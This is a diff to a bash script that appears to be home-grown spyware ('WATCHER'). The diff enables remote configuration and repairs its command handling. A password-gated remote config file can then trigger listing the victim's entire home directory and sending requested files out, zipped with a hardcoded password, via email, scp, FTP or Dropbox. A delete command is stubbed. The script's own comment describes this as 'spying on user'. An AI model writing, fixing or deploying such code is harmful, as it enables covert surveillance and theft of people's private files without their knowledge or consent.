@@ -66,23 +66,23 @@ function clean_dir {
 function remote_config {
 	ACTIVATE=0
 	MD5OLD="none"
-	[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old"`
+	[ -f "$REMOTE_CONFIG_NAME.old" ] && MD5OLD=`md5sum "$REMOTE_CONFIG_NAME.old" | cut -d " " -f 1`
+	# following cp command is for testing purposes only; delete it and uncomment wget command!
 	cp WATCHER-hard.cfg WATCHER.cfg
 	#! `wget -q --no-cache "$REMOTE_CONFIG_ADDRESS/$REMOTE_CONFIG_NAME"` && return 1
-	MD5NEW=`md5sum "$REMOTE_CONFIG_NAME"`
+	MD5NEW=`md5sum "$REMOTE_CONFIG_NAME" | cut -d " " -f 1`
 	echo "$MD5OLD $MD5NEW"
-	if [ ! "$MD5NEW" = "$MD5OLD" ]
+	if [[ "$MD5NEW" != "$MD5OLD" ]]
 	then
 		while read line_conf; do
-		DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 		line_conf1=`echo $line_conf | cut -d : -f 1`
-		line_conf2=`echo $line_conf | cut -d : -f 1`
-		[ "$line_conf1" = "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1
-		[ "$line_conf1" = "listfiles" ] && [ $ACTIVATE -eq 1 ] && `find ~/>file_list-$DATA.txt` && `zip -r tmp/file_list-$DATA.zip -P 42p6b2V3hy7c92g42p6b2V3hy7c92g file_list-$DATA.txt` && `mv tmp/file_list-$DATA.zip tosendlater/`
-		[ "$line_conf1" = "filedata" ] && [ $ACTIVATE -eq 1 ] && echo "File data"
-		[ "$line_conf1" = "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
-		[ "$line_conf1" = "downloadfile" ] && [ $ACTIVATE -eq 1 ] && remote_send_file "$line_conf2"
-		[ "$line_conf1" = "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
+		line_conf2=`echo $line_conf | cut -d : -f 2`
+		[ "$line_conf1" == "$REMOTE_ACTIVATION_PASS" ] && ACTIVATE=1 && echo "Pass OK"
+		[ "$line_conf1" == "listfiles" ] && [ $ACTIVATE -eq 1 ] && file_list 
+		[ "$line_conf1" == "filedata" ] && [ $ACTIVATE -eq 1 ] && echo "File data"
+		[ "$line_conf1" == "dirdata" ] && [ $ACTIVATE -eq 1 ] && echo "Dir data"
+		[ "$line_conf1" == "downloadfile" ] && [ $ACTIVATE -eq 1 ] && remote_send_file "$line_conf2"
+		[ "$line_conf1" == "delfile" ] && [ $ACTIVATE -eq 1 ] && echo "Delete $line_conf2"
 		# post other options here
 		done < $REMOTE_CONFIG_NAME
 		mv "$REMOTE_CONFIG_NAME" "$REMOTE_CONFIG_NAME.old"
@@ -92,7 +92,15 @@ function remote_config {
 	unset MD5NEW
 }
 
+function file_list {
+	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
+	find ~/>file_list-$DATA.txt
+	remote_send_file "file_list-$DATA.txt"
+	rm file_list-$DATA.txt
+}
+
 function remote_send_file {
+	[ ! -f "$1" ] && return 1
 	FILESIZE=`du -s "$1" | cut -f 1`
 	DATA=`date +"%Y-%m-%d-%H-%M-%S"`
 	FILE_NAME_sf="filerequest-$DATA-$RANDOM"
@@ -100,18 +108,19 @@ function remote_send_file {
 	then
 		zip -r "tmp/$FILE_NAME_sf.zip" -P 42p6b2V3hy7c92g42p6b2V3hy7c92g "$1"
 		[ $SMTP_CONNECTION -eq 1 ] && fsendemail "SendRequestedFile - $DATA" "Requested file" "$FILENAME"
-		[ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.zip"
-		[ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.zip"
-		[ $R_DB -eq 1 ] && run_dropbox_file "$1"
+		[ -f "$1" ] && [ $R_SCP -eq 1 ] && run_scp "tmp/$FILE_NAME_sf.zip"
+		[ -f "$1" ] && [ $R_FTP -eq 1 ] && run_ftp "tmp/$FILE_NAME_sf.zip"
+		[ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "tmp/$FILE_NAME_sf.zip"
 		[ -f "tmp/$FILE_NAME_sf.zip" ] && mv "tmp/$FILE_NAME_sf.zip" tosendlater/
 	else
 		# What to do, when file is greater than max attachement size.
-		[ $R_SCP -eq 1 ] && run_scp "$1"
-		[ $R_FTP -eq 1 ] && run_ftp "$1"
-		[ $R_DB -eq 1 ] && run_dropbox_file "$1"
+		[ $R_SCP -eq 1 ] && [ -f "$1" ] && run_scp "$1"
+		[ $R_FTP -eq 1 ] && [ -f "$1" ] && run_ftp "$1"
+		[ $R_DB -eq 1 ] && [ -f "$1" ] && run_dropbox_file "$1"
 	fi
 	unset FILESIZE
 	unset FILE_NAME_sf
+	return 0
 }
 
 function run_send_later {
@@ -124,7 +133,7 @@ function run_dropbox {
 }
 
 function run_dropbox_file {
-	cp -u "$1" "$DB_DIR2/"
+	cp -u "$1" "$DB_DIR2"
 }
 
 function run_scp {
@@ -205,7 +214,7 @@ DB_DIR_WARNING_SIZE=40000
 DB_DIR_MAX_SIZE=120000
 
 # Remote config:
-REMOTE_CONFIG=0 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated, but carry on when remote_file_config dissapeard
+REMOTE_CONFIG=2 # 0 - don't; 1 - run only if config exists; 2 - check config but run even if config doesn't exists; 3 - run only when activated, but carry on when remote_file_config dissapeard
 REMOTE_CONFIG_ADDRESS="www.google.com" # Address to dir containing file
 REMOTE_CONFIG_NAME="WATCHER.cfg" # File name
 REMOTE_ACTIVATION_PASS="PASS" # Password (it should be placed at the top of config file), it will activate spying on user if you decoded so
